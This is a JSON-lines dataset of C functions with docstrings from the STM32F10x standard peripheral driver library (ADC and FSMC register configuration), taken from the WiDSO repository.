{"docstring": "/**\n  * @brief  Checks whether the specified FSMC flag is set or not.\n  * @param  FSMC_Bank: specifies the FSMC Bank to be used\n  *   This parameter can be one of the following values:\n  *     @arg FSMC_Bank2_NAND: FSMC Bank2 NAND \n  *     @arg FSMC_Bank3_NAND: FSMC Bank3 NAND\n  *     @arg FSMC_Bank4_PCCARD: FSMC Bank4 PCCARD\n  * @param  FSMC_FLAG: specifies the flag to check.\n  *   This parameter can be one of the following values:\n  *     @arg FSMC_FLAG_RisingEdge: Rising egde detection Flag.\n  *     @arg FSMC_FLAG_Level: Level detection Flag.\n  *     @arg FSMC_FLAG_FallingEdge: Falling egde detection Flag.\n  *     @arg FSMC_FLAG_FEMPT: Fifo empty Flag. \n  * @retval The new state of FSMC_FLAG (SET or RESET).\n  */\n", "func_signal": "FlagStatus FSMC_GetFlagStatus(uint32_t FSMC_Bank, uint32_t FSMC_FLAG)", "code": "{\n  FlagStatus bitstatus = RESET;\n  uint32_t tmpsr = 0x00000000;\n  \n  /* Check the parameters */\n  assert_param(IS_FSMC_GETFLAG_BANK(FSMC_Bank));\n  assert_param(IS_FSMC_GET_FLAG(FSMC_FLAG));\n  \n  if(FSMC_Bank == FSMC_Bank2_NAND)\n  {\n    tmpsr = FSMC_Bank2->SR2;\n  }  \n  else if(FSMC_Bank == FSMC_Bank3_NAND)\n  {\n    tmpsr = FSMC_Bank3->SR3;\n  }\n  /* FSMC_Bank4_PCCARD*/\n  else\n  {\n    tmpsr = FSMC_Bank4->SR4;\n  } \n  \n  /* Get the flag status */\n  if ((tmpsr & FSMC_FLAG) != (uint16_t)RESET )\n  {\n    bitstatus = SET;\n  }\n  else\n  {\n    bitstatus = RESET;\n  }\n  /* Return the flag status */\n  return bitstatus;\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_fsmc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Returns the last ADCx conversion result data for regular channel.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval The Data conversion value.\n  */\n", "func_signal": "uint16_t ADC_GetConversionValue(ADC_TypeDef* ADCx)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  /* Return the selected ADC conversion value */\n  return (uint16_t) ADCx->DR;\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Initializes the FSMC NAND Banks according to the specified \n  *         parameters in the FSMC_NANDInitStruct.\n  * @param  FSMC_NANDInitStruct : pointer to a FSMC_NANDInitTypeDef \n  *         structure that contains the configuration information for the FSMC \n  *         NAND specified Banks.                       \n  * @retval None\n  */\n", "func_signal": "void FSMC_NANDInit(FSMC_NANDInitTypeDef* FSMC_NANDInitStruct)", "code": "{\n  uint32_t tmppcr = 0x00000000, tmppmem = 0x00000000, tmppatt = 0x00000000; \n    \n  /* Check the parameters */\n  assert_param( IS_FSMC_NAND_BANK(FSMC_NANDInitStruct->FSMC_Bank));\n  assert_param( IS_FSMC_WAIT_FEATURE(FSMC_NANDInitStruct->FSMC_Waitfeature));\n  assert_param( IS_FSMC_MEMORY_WIDTH(FSMC_NANDInitStruct->FSMC_MemoryDataWidth));\n  assert_param( IS_FSMC_ECC_STATE(FSMC_NANDInitStruct->FSMC_ECC));\n  assert_param( IS_FSMC_ECCPAGE_SIZE(FSMC_NANDInitStruct->FSMC_ECCPageSize));\n  assert_param( IS_FSMC_TCLR_TIME(FSMC_NANDInitStruct->FSMC_TCLRSetupTime));\n  assert_param( IS_FSMC_TAR_TIME(FSMC_NANDInitStruct->FSMC_TARSetupTime));\n  assert_param(IS_FSMC_SETUP_TIME(FSMC_NANDInitStruct->FSMC_CommonSpaceTimingStruct->FSMC_SetupTime));\n  assert_param(IS_FSMC_WAIT_TIME(FSMC_NANDInitStruct->FSMC_CommonSpaceTimingStruct->FSMC_WaitSetupTime));\n  assert_param(IS_FSMC_HOLD_TIME(FSMC_NANDInitStruct->FSMC_CommonSpaceTimingStruct->FSMC_HoldSetupTime));\n  assert_param(IS_FSMC_HIZ_TIME(FSMC_NANDInitStruct->FSMC_CommonSpaceTimingStruct->FSMC_HiZSetupTime));\n  assert_param(IS_FSMC_SETUP_TIME(FSMC_NANDInitStruct->FSMC_AttributeSpaceTimingStruct->FSMC_SetupTime));\n  assert_param(IS_FSMC_WAIT_TIME(FSMC_NANDInitStruct->FSMC_AttributeSpaceTimingStruct->FSMC_WaitSetupTime));\n  assert_param(IS_FSMC_HOLD_TIME(FSMC_NANDInitStruct->FSMC_AttributeSpaceTimingStruct->FSMC_HoldSetupTime));\n  assert_param(IS_FSMC_HIZ_TIME(FSMC_NANDInitStruct->FSMC_AttributeSpaceTimingStruct->FSMC_HiZSetupTime));\n  \n  /* Set the tmppcr value according to FSMC_NANDInitStruct parameters */\n  tmppcr = (uint32_t)FSMC_NANDInitStruct->FSMC_Waitfeature |\n            PCR_MemoryType_NAND |\n            FSMC_NANDInitStruct->FSMC_MemoryDataWidth |\n            FSMC_NANDInitStruct->FSMC_ECC |\n            FSMC_NANDInitStruct->FSMC_ECCPageSize |\n            (FSMC_NANDInitStruct->FSMC_TCLRSetupTime << 9 )|\n            (FSMC_NANDInitStruct->FSMC_TARSetupTime << 13);\n            \n  /* Set tmppmem value according to FSMC_CommonSpaceTimingStructure parameters */\n  tmppmem = (uint32_t)FSMC_NANDInitStruct->FSMC_CommonSpaceTimingStruct->FSMC_SetupTime |\n            (FSMC_NANDInitStruct->FSMC_CommonSpaceTimingStruct->FSMC_WaitSetupTime << 8) |\n            (FSMC_NANDInitStruct->FSMC_CommonSpaceTimingStruct->FSMC_HoldSetupTime << 16)|\n            (FSMC_NANDInitStruct->FSMC_CommonSpaceTimingStruct->FSMC_HiZSetupTime << 24); \n            \n  /* Set tmppatt value according to FSMC_AttributeSpaceTimingStructure parameters */\n  tmppatt = (uint32_t)FSMC_NANDInitStruct->FSMC_AttributeSpaceTimingStruct->FSMC_SetupTime |\n            (FSMC_NANDInitStruct->FSMC_AttributeSpaceTimingStruct->FSMC_WaitSetupTime << 8) |\n            (FSMC_NANDInitStruct->FSMC_AttributeSpaceTimingStruct->FSMC_HoldSetupTime << 16)|\n            (FSMC_NANDInitStruct->FSMC_AttributeSpaceTimingStruct->FSMC_HiZSetupTime << 24);\n  \n  if(FSMC_NANDInitStruct->FSMC_Bank == FSMC_Bank2_NAND)\n  {\n    /* FSMC_Bank2_NAND registers configuration */\n    FSMC_Bank2->PCR2 = tmppcr;\n    FSMC_Bank2->PMEM2 = tmppmem;\n    FSMC_Bank2->PATT2 = tmppatt;\n  }\n  else\n  {\n    /* FSMC_Bank3_NAND registers configuration */\n    FSMC_Bank3->PCR3 = tmppcr;\n    FSMC_Bank3->PMEM3 = tmppmem;\n    FSMC_Bank3->PATT3 = tmppatt;\n  }\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_fsmc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Initializes the ADCx peripheral according to the specified parameters\n  *         in the ADC_InitStruct.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_InitStruct: pointer to an ADC_InitTypeDef structure that contains\n  *         the configuration information for the specified ADC peripheral.\n  * @retval None\n  */\n", "func_signal": "void ADC_Init(ADC_TypeDef* ADCx, ADC_InitTypeDef* ADC_InitStruct)", "code": "{\n  uint32_t tmpreg1 = 0;\n  uint8_t tmpreg2 = 0;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_MODE(ADC_InitStruct->ADC_Mode));\n  assert_param(IS_FUNCTIONAL_STATE(ADC_InitStruct->ADC_ScanConvMode));\n  assert_param(IS_FUNCTIONAL_STATE(ADC_InitStruct->ADC_ContinuousConvMode));\n  assert_param(IS_ADC_EXT_TRIG(ADC_InitStruct->ADC_ExternalTrigConv));   \n  assert_param(IS_ADC_DATA_ALIGN(ADC_InitStruct->ADC_DataAlign)); \n  assert_param(IS_ADC_REGULAR_LENGTH(ADC_InitStruct->ADC_NbrOfChannel));\n\n  /*---------------------------- ADCx CR1 Configuration -----------------*/\n  /* Get the ADCx CR1 value */\n  tmpreg1 = ADCx->CR1;\n  /* Clear DUALMOD and SCAN bits */\n  tmpreg1 &= CR1_CLEAR_Mask;\n  /* Configure ADCx: Dual mode and scan conversion mode */\n  /* Set DUALMOD bits according to ADC_Mode value */\n  /* Set SCAN bit according to ADC_ScanConvMode value */\n  tmpreg1 |= (uint32_t)(ADC_InitStruct->ADC_Mode | ((uint32_t)ADC_InitStruct->ADC_ScanConvMode << 8));\n  /* Write to ADCx CR1 */\n  ADCx->CR1 = tmpreg1;\n\n  /*---------------------------- ADCx CR2 Configuration -----------------*/\n  /* Get the ADCx CR2 value */\n  tmpreg1 = ADCx->CR2;\n  /* Clear CONT, ALIGN and EXTSEL bits */\n  tmpreg1 &= CR2_CLEAR_Mask;\n  /* Configure ADCx: external trigger event and continuous conversion mode */\n  /* Set ALIGN bit according to ADC_DataAlign value */\n  /* Set EXTSEL bits according to ADC_ExternalTrigConv value */\n  /* Set CONT bit according to ADC_ContinuousConvMode value */\n  tmpreg1 |= (uint32_t)(ADC_InitStruct->ADC_DataAlign | ADC_InitStruct->ADC_ExternalTrigConv |\n            ((uint32_t)ADC_InitStruct->ADC_ContinuousConvMode << 1));\n  /* Write to ADCx CR2 */\n  ADCx->CR2 = tmpreg1;\n\n  /*---------------------------- ADCx SQR1 Configuration -----------------*/\n  /* Get the ADCx SQR1 value */\n  tmpreg1 = ADCx->SQR1;\n  /* Clear L bits */\n  tmpreg1 &= SQR1_CLEAR_Mask;\n  /* Configure ADCx: regular channel sequence length */\n  /* Set L bits according to ADC_NbrOfChannel value */\n  tmpreg2 |= (uint8_t) (ADC_InitStruct->ADC_NbrOfChannel - (uint8_t)1);\n  tmpreg1 |= (uint32_t)tmpreg2 << 20;\n  /* Write to ADCx SQR1 */\n  ADCx->SQR1 = tmpreg1;\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Fills each FSMC_NORSRAMInitStruct member with its default value.\n  * @param  FSMC_NORSRAMInitStruct: pointer to a FSMC_NORSRAMInitTypeDef \n  *         structure which will be initialized.\n  * @retval None\n  */\n", "func_signal": "void FSMC_NORSRAMStructInit(FSMC_NORSRAMInitTypeDef* FSMC_NORSRAMInitStruct)", "code": "{  \n  /* Reset NOR/SRAM Init structure parameters values */\n  FSMC_NORSRAMInitStruct->FSMC_Bank = FSMC_Bank1_NORSRAM1;\n  FSMC_NORSRAMInitStruct->FSMC_DataAddressMux = FSMC_DataAddressMux_Enable;\n  FSMC_NORSRAMInitStruct->FSMC_MemoryType = FSMC_MemoryType_SRAM;\n  FSMC_NORSRAMInitStruct->FSMC_MemoryDataWidth = FSMC_MemoryDataWidth_8b;\n  FSMC_NORSRAMInitStruct->FSMC_BurstAccessMode = FSMC_BurstAccessMode_Disable;\n  FSMC_NORSRAMInitStruct->FSMC_AsynchronousWait = FSMC_AsynchronousWait_Disable;\n  FSMC_NORSRAMInitStruct->FSMC_WaitSignalPolarity = FSMC_WaitSignalPolarity_Low;\n  FSMC_NORSRAMInitStruct->FSMC_WrapMode = FSMC_WrapMode_Disable;\n  FSMC_NORSRAMInitStruct->FSMC_WaitSignalActive = FSMC_WaitSignalActive_BeforeWaitState;\n  FSMC_NORSRAMInitStruct->FSMC_WriteOperation = FSMC_WriteOperation_Enable;\n  FSMC_NORSRAMInitStruct->FSMC_WaitSignal = FSMC_WaitSignal_Enable;\n  FSMC_NORSRAMInitStruct->FSMC_ExtendedMode = FSMC_ExtendedMode_Disable;\n  FSMC_NORSRAMInitStruct->FSMC_WriteBurst = FSMC_WriteBurst_Disable;\n  FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_AddressSetupTime = 0xF;\n  FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_AddressHoldTime = 0xF;\n  FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_DataSetupTime = 0xFF;\n  FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_BusTurnAroundDuration = 0xF;\n  FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_CLKDivision = 0xF;\n  FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_DataLatency = 0xF;\n  FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_AccessMode = FSMC_AccessMode_A; \n  FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_AddressSetupTime = 0xF;\n  FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_AddressHoldTime = 0xF;\n  FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_DataSetupTime = 0xFF;\n  FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_BusTurnAroundDuration = 0xF;\n  FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_CLKDivision = 0xF;\n  FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_DataLatency = 0xF;\n  FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_AccessMode = FSMC_AccessMode_A;\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_fsmc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Enables or disables the ADCx conversion through external trigger.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC external trigger start of conversion.\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_ExternalTrigConvCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC conversion on external event */\n    ADCx->CR2 |= CR2_EXTTRIG_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC conversion on external event */\n    ADCx->CR2 &= CR2_EXTTRIG_Reset;\n  }\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Configures the sequencer length for injected channels\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  Length: The sequencer length. \n  *   This parameter must be a number between 1 to 4.\n  * @retval None\n  */\n", "func_signal": "void ADC_InjectedSequencerLengthConfig(ADC_TypeDef* ADCx, uint8_t Length)", "code": "{\n  uint32_t tmpreg1 = 0;\n  uint32_t tmpreg2 = 0;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_INJECTED_LENGTH(Length));\n  \n  /* Get the old register value */\n  tmpreg1 = ADCx->JSQR;\n  /* Clear the old injected sequnence lenght JL bits */\n  tmpreg1 &= JSQR_JL_Reset;\n  /* Set the injected sequnence lenght JL bits */\n  tmpreg2 = Length - 1; \n  tmpreg1 |= tmpreg2 << 20;\n  /* Store the new register value */\n  ADCx->JSQR = tmpreg1;\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Gets the selected ADC reset calibration registers status.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval The new state of ADC reset calibration registers (SET or RESET).\n  */\n", "func_signal": "FlagStatus ADC_GetResetCalibrationStatus(ADC_TypeDef* ADCx)", "code": "{\n  FlagStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  /* Check the status of RSTCAL bit */\n  if ((ADCx->CR2 & CR2_RSTCAL_Set) != (uint32_t)RESET)\n  {\n    /* RSTCAL bit is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* RSTCAL bit is reset */\n    bitstatus = RESET;\n  }\n  /* Return the RSTCAL bit status */\n  return  bitstatus;\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Gets the selected ADC calibration status.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval The new state of ADC calibration (SET or RESET).\n  */\n", "func_signal": "FlagStatus ADC_GetCalibrationStatus(ADC_TypeDef* ADCx)", "code": "{\n  FlagStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  /* Check the status of CAL bit */\n  if ((ADCx->CR2 & CR2_CAL_Set) != (uint32_t)RESET)\n  {\n    /* CAL bit is set: calibration on going */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* CAL bit is reset: end of calibration */\n    bitstatus = RESET;\n  }\n  /* Return the CAL bit status */\n  return  bitstatus;\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Returns the ADC injected channel conversion result\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_InjectedChannel: the converted ADC injected channel.\n  *   This parameter can be one of the following values:\n  *     @arg ADC_InjectedChannel_1: Injected Channel1 selected\n  *     @arg ADC_InjectedChannel_2: Injected Channel2 selected\n  *     @arg ADC_InjectedChannel_3: Injected Channel3 selected\n  *     @arg ADC_InjectedChannel_4: Injected Channel4 selected\n  * @retval The Data conversion value.\n  */\n", "func_signal": "uint16_t ADC_GetInjectedConversionValue(ADC_TypeDef* ADCx, uint8_t ADC_InjectedChannel)", "code": "{\n  __IO uint32_t tmp = 0;\n  \n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_INJECTED_CHANNEL(ADC_InjectedChannel));\n\n  tmp = (uint32_t)ADCx;\n  tmp += ADC_InjectedChannel + JDR_Offset;\n  \n  /* Returns the selected injected channel conversion data value */\n  return (uint16_t) (*(__IO uint32_t*)  tmp);   \n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Configures the high and low thresholds of the analog watchdog.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  HighThreshold: the ADC analog watchdog High threshold value.\n  *   This parameter must be a 12bit value.\n  * @param  LowThreshold: the ADC analog watchdog Low threshold value.\n  *   This parameter must be a 12bit value.\n  * @retval None\n  */\n", "func_signal": "void ADC_AnalogWatchdogThresholdsConfig(ADC_TypeDef* ADCx, uint16_t HighThreshold,\n                                        uint16_t LowThreshold)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_THRESHOLD(HighThreshold));\n  assert_param(IS_ADC_THRESHOLD(LowThreshold));\n  /* Set the ADCx high threshold */\n  ADCx->HTR = HighThreshold;\n  /* Set the ADCx low threshold */\n  ADCx->LTR = LowThreshold;\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Fills each ADC_InitStruct member with its default value.\n  * @param  ADC_InitStruct : pointer to an ADC_InitTypeDef structure which will be initialized.\n  * @retval None\n  */\n", "func_signal": "void ADC_StructInit(ADC_InitTypeDef* ADC_InitStruct)", "code": "{\n  /* Reset ADC init structure parameters values */\n  /* Initialize the ADC_Mode member */\n  ADC_InitStruct->ADC_Mode = ADC_Mode_Independent;\n  /* initialize the ADC_ScanConvMode member */\n  ADC_InitStruct->ADC_ScanConvMode = DISABLE;\n  /* Initialize the ADC_ContinuousConvMode member */\n  ADC_InitStruct->ADC_ContinuousConvMode = DISABLE;\n  /* Initialize the ADC_ExternalTrigConv member */\n  ADC_InitStruct->ADC_ExternalTrigConv = ADC_ExternalTrigConv_T1_CC1;\n  /* Initialize the ADC_DataAlign member */\n  ADC_InitStruct->ADC_DataAlign = ADC_DataAlign_Right;\n  /* Initialize the ADC_NbrOfChannel member */\n  ADC_InitStruct->ADC_NbrOfChannel = 1;\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Checks whether the specified ADC interrupt has occurred or not.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_IT: specifies the ADC interrupt source to check. \n  *   This parameter can be one of the following values:\n  *     @arg ADC_IT_EOC: End of conversion interrupt mask\n  *     @arg ADC_IT_AWD: Analog watchdog interrupt mask\n  *     @arg ADC_IT_JEOC: End of injected conversion interrupt mask\n  * @retval The new state of ADC_IT (SET or RESET).\n  */\n", "func_signal": "ITStatus ADC_GetITStatus(ADC_TypeDef* ADCx, uint16_t ADC_IT)", "code": "{\n  ITStatus bitstatus = RESET;\n  uint32_t itmask = 0, enablestatus = 0;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_GET_IT(ADC_IT));\n  /* Get the ADC IT index */\n  itmask = ADC_IT >> 8;\n  /* Get the ADC_IT enable bit status */\n  enablestatus = (ADCx->CR1 & (uint8_t)ADC_IT) ;\n  /* Check the status of the specified ADC interrupt */\n  if (((ADCx->SR & itmask) != (uint32_t)RESET) && enablestatus)\n  {\n    /* ADC_IT is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* ADC_IT is reset */\n    bitstatus = RESET;\n  }\n  /* Return the ADC_IT status */\n  return  bitstatus;\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Enables or disables the selected ADC software start conversion .\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC software start conversion.\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_SoftwareStartConvCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC conversion on external event and start the selected\n       ADC conversion */\n    ADCx->CR2 |= CR2_EXTTRIG_SWSTART_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC conversion on external event and stop the selected\n       ADC conversion */\n    ADCx->CR2 &= CR2_EXTTRIG_SWSTART_Reset;\n  }\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Enables or disables the selected ADC automatic injected group\n  *         conversion after regular one.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC auto injected conversion\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_AutoInjectedConvCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC automatic injected group conversion */\n    ADCx->CR1 |= CR1_JAUTO_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC automatic injected group conversion */\n    ADCx->CR1 &= CR1_JAUTO_Reset;\n  }\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Enables or disables the specified FSMC interrupts.\n  * @param  FSMC_Bank: specifies the FSMC Bank to be used\n  *   This parameter can be one of the following values:\n  *     @arg FSMC_Bank2_NAND: FSMC Bank2 NAND \n  *     @arg FSMC_Bank3_NAND: FSMC Bank3 NAND\n  *     @arg FSMC_Bank4_PCCARD: FSMC Bank4 PCCARD\n  * @param  FSMC_IT: specifies the FSMC interrupt sources to be enabled or disabled.\n  *   This parameter can be any combination of the following values:\n  *     @arg FSMC_IT_RisingEdge: Rising edge detection interrupt. \n  *     @arg FSMC_IT_Level: Level edge detection interrupt.\n  *     @arg FSMC_IT_FallingEdge: Falling edge detection interrupt.\n  * @param  NewState: new state of the specified FSMC interrupts.\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void FSMC_ITConfig(uint32_t FSMC_Bank, uint32_t FSMC_IT, FunctionalState NewState)", "code": "{\n  assert_param(IS_FSMC_IT_BANK(FSMC_Bank));\n  assert_param(IS_FSMC_IT(FSMC_IT));\t\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  \n  if (NewState != DISABLE)\n  {\n    /* Enable the selected FSMC_Bank2 interrupts */\n    if(FSMC_Bank == FSMC_Bank2_NAND)\n    {\n      FSMC_Bank2->SR2 |= FSMC_IT;\n    }\n    /* Enable the selected FSMC_Bank3 interrupts */\n    else if (FSMC_Bank == FSMC_Bank3_NAND)\n    {\n      FSMC_Bank3->SR3 |= FSMC_IT;\n    }\n    /* Enable the selected FSMC_Bank4 interrupts */\n    else\n    {\n      FSMC_Bank4->SR4 |= FSMC_IT;    \n    }\n  }\n  else\n  {\n    /* Disable the selected FSMC_Bank2 interrupts */\n    if(FSMC_Bank == FSMC_Bank2_NAND)\n    {\n      \n      FSMC_Bank2->SR2 &= (uint32_t)~FSMC_IT;\n    }\n    /* Disable the selected FSMC_Bank3 interrupts */\n    else if (FSMC_Bank == FSMC_Bank3_NAND)\n    {\n      FSMC_Bank3->SR3 &= (uint32_t)~FSMC_IT;\n    }\n    /* Disable the selected FSMC_Bank4 interrupts */\n    else\n    {\n      FSMC_Bank4->SR4 &= (uint32_t)~FSMC_IT;    \n    }\n  }\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_fsmc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Checks whether the specified FSMC interrupt has occurred or not.\n  * @param  FSMC_Bank: specifies the FSMC Bank to be used\n  *   This parameter can be one of the following values:\n  *     @arg FSMC_Bank2_NAND: FSMC Bank2 NAND \n  *     @arg FSMC_Bank3_NAND: FSMC Bank3 NAND\n  *     @arg FSMC_Bank4_PCCARD: FSMC Bank4 PCCARD\n  * @param  FSMC_IT: specifies the FSMC interrupt source to check.\n  *   This parameter can be one of the following values:\n  *     @arg FSMC_IT_RisingEdge: Rising edge detection interrupt. \n  *     @arg FSMC_IT_Level: Level edge detection interrupt.\n  *     @arg FSMC_IT_FallingEdge: Falling edge detection interrupt. \n  * @retval The new state of FSMC_IT (SET or RESET).\n  */\n", "func_signal": "ITStatus FSMC_GetITStatus(uint32_t FSMC_Bank, uint32_t FSMC_IT)", "code": "{\n  ITStatus bitstatus = RESET;\n  uint32_t tmpsr = 0x0, itstatus = 0x0, itenable = 0x0; \n  \n  /* Check the parameters */\n  assert_param(IS_FSMC_IT_BANK(FSMC_Bank));\n  assert_param(IS_FSMC_GET_IT(FSMC_IT));\n  \n  if(FSMC_Bank == FSMC_Bank2_NAND)\n  {\n    tmpsr = FSMC_Bank2->SR2;\n  }  \n  else if(FSMC_Bank == FSMC_Bank3_NAND)\n  {\n    tmpsr = FSMC_Bank3->SR3;\n  }\n  /* FSMC_Bank4_PCCARD*/\n  else\n  {\n    tmpsr = FSMC_Bank4->SR4;\n  } \n  \n  itstatus = tmpsr & FSMC_IT;\n  \n  itenable = tmpsr & (FSMC_IT >> 3);\n  if ((itstatus != (uint32_t)RESET)  && (itenable != (uint32_t)RESET))\n  {\n    bitstatus = SET;\n  }\n  else\n  {\n    bitstatus = RESET;\n  }\n  return bitstatus; \n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_fsmc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
